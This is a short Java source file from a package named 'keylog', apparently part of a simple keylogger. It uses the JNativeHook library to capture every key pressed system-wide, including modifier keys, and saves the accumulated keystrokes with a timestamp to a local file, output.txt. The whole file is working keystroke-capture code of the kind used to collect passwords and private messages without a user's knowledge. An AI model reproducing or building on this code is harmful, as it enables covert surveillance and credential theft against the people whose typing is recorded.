package keylog;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.Date;

public class NativeKeyBoard implements NativeKeyListener {

    public static String captured = "";

    public void nativeKeyPressed(NativeKeyEvent e) {
        //Gets the keycode of the key that was pressed
        String keyStroke = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (keyStroke.length() > 1 && !keyStroke.equals("Space")) {
            captured = captured + "\n" + "Modifier Key Pressed: " + keyStroke + "\n";
        } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")){
            captured+= " ";
        }
        else {
            captured += keyStroke;
        }

    }

    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    public void onSave() {
        File file = new File("output.txt");
        try (PrintWriter out = new PrintWriter(file, "UTF-8")) {
            out.write("DU LIEU VAO LUC: " + new Date().toString() + "\n");
            out.write(captured);
            out.write("\n-------------------------------------");
            captured = "";
        } catch (FileNotFoundException | UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
    }

}
